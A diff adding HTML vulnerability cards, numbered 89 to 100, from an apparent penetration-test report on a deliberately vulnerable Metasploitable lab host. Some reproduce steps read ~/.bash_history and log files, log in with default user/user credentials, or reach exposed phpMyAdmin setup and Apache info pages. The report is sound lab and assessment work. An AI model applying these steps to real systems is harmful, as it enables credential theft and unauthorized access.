+        <p>The TCP Wrappers configuration file (<code>/etc/hosts.allow</code>) is configured to allow connections to all services from all IP addresses. This ignores a layer of defense-in-depth that could restrict access to critical services like SSH or Telnet.</p>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">89. Sensitive Data in .bash_history</div>
+        <span class="tag">Info Leak</span> <span class="tag">Post-Exploit</span>
+        <h3>## Summary:</h3>
+        <p>The command history for the <code>msfadmin</code> and <code>root</code> users is not cleared. It contains sensitive commands, including passwords passed in the command line and paths to internal configuration files.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Gain shell access.</li>
+            <li>Run: <code>cat ~/.bash_history</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">90. phpMyAdmin Setup Scripts Left in Place</div>
+        <span class="tag">RCE</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/scripts/setup.php</code> file in the phpMyAdmin directory was not deleted after installation. This allows an attacker to reconfigure the application or perform PHP code injection.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/phpMyAdmin/scripts/setup.php</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">91. Anonymous Access to Samba IPC$ Share</div>
+        <span class="tag">SMB</span> <span class="tag">Recon</span>
+        <h3>## Summary:</h3>
+        <p>The Inter-Process Communication (IPC$) share is accessible anonymously. This allows an attacker to map domain accounts, list shares, and identify the version of the Samba service without a password.</p>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">92. Default/Weak Credentials (user:user)</div>
+        <span class="tag">Weak Auth</span> <span class="tag">System</span>
+        <h3>## Summary:</h3>
+        <p>The system includes a standard user account with the username <code>user</code> and password <code>user</code>. This provides an easy entry point for attackers to gain a low-privilege shell and begin local privilege escalation attempts.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Try logging into SSH or Telnet with <b>user / user</b>.</li>
+        </ol>
+    </div>
+    <div class="vuln-card medium">
+        <div class="vuln-title">93. World-Readable /var/log/ Directory</div>
+        <span class="tag">Info Leak</span> <span class="tag">System</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/var/log/</code> directory and many of its sub-files (like <code>auth.log</code> or <code>apache2/access.log</code>) have incorrect permissions, allowing any low-privilege user to read them. This reveals login patterns, source IP addresses, and failed command attempts.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Login as <code>msfadmin</code>.</li>
+            <li>Run: <code>cat /var/log/apache2/access.log</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">94. Distccd Banner Version Disclosure (Port 3632)</div>
+        <span class="tag">Recon</span> <span class="tag">Fingerprint</span>
+        <h3>## Summary:</h3>
+        <p>The Distributed Compiler (distcc) service reveals its version and environment details upon connection. This allows an attacker to confirm the presence of the <code>distcc_exec</code> vulnerability (CVE-2004-2687) without sending a full exploit payload.</p>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">95. FTP SYST System Type Disclosure</div>
+        <span class="tag">Recon</span> <span class="tag">FTP</span>
+        <h3>## Summary:</h3>
+        <p>The FTP server responds to the <code>SYST</code> command by revealing the exact OS type (UNIX Type: L8). This is a minor information leak that assists in tailoring payloads for the specific OS architecture.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect: <code>ftp 192.168.99.131</code></li>
+            <li>Type: <code>SYST</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">96. Apache /doc/ Directory Information Leak</div>
+        <span class="tag">Recon</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/doc/</code> directory is accessible via the web browser. It contains documentation for installed packages on the system, which allows an attacker to create a highly accurate inventory of every software version installed on the server.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/doc/</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">97. Potential Open Proxy via mod_proxy</div>
+        <span class="tag">Proxy</span> <span class="tag">SSRF</span>
+        <h3>## Summary:</h3>
+        <p>The Apache <code>mod_proxy</code> module is enabled and potentially misconfigured. This can be abused by attackers to use the Metasploitable server as an "Open Proxy" to attack other internal machines or hide their source IP address during external attacks.</p>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">98. Apache /server-info Configuration Disclosure</div>
+        <span class="tag">Info Leak</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/server-info</code> handler is enabled. This page provides a comprehensive overview of the Apache configuration, including all loaded modules, directives, and settings in <code>httpd.conf</code>.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/server-info</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">99. Weak Password Hashing (MD5/DES)</div>
+        <span class="tag">Crypto</span> <span class="tag">System</span>
+        <h3>## Summary:</h3>
+        <p>The system uses older, non-salted MD5 or DES algorithms for storing user passwords in <code>/etc/shadow</code>. These hashes are extremely vulnerable to GPU-accelerated brute-force attacks compared to modern algorithms like SHA-512 or Argon2.</p>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">100. Intentional "Insecure by Default" Design</div>
+        <span class="tag">Compliance</span> <span class="tag">Governance</span>
+        <h3>## Summary:</h3>
+        <p>The ultimate vulnerability is that the system is designed to be intentionally vulnerable. This results in a "cascading failure" where one exploit (like VSFTPD) provides access to others (like UDEV PrivEsc), which is a major risk in real-world environments with unpatched legacy systems.</p>
+    </div>
 </body>
 </html>
